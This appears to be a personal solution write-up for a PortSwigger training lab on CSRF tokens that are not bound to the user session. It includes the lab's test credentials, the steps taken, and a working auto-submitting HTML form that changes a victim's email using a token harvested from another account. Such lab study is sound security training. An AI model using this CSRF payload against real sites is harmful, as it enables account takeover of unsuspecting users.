
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya



1) login as wiener:peter, go on /my-account and copy the csrf token contained in the form for email updating
2) logout and login as carlos:montoya, go on /my-account, change the csrf token in the form with wiener's one
3) try to change carlos email
    it works, so we just need a valid csrf

4) craft a html code that performs a POST request to /change-email with a valid csrf token we cna extract from wiener session 











here the token is not associated with the user session so we just need to obtain a valid token, so we log in as wiener, we take the csrf token in the hidden field and we use it in the exploit


<html>
  <body>
     <form class="login-form" name="change-email-form" action="https://******LAB-ID******.web-security-academy.net/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required="" type="email" name="email" value="pippo@email.com">
                            <input required="" type="hidden" name="csrf" value="UdMhgn5Y5kGCLXK2iBu9k3EFRS1Dih6b">
                            <button class="button" type="submit"> Update email </button>
      </form>

    <script>
       document.forms[0].submit()
    </script>


  </body>


</html>
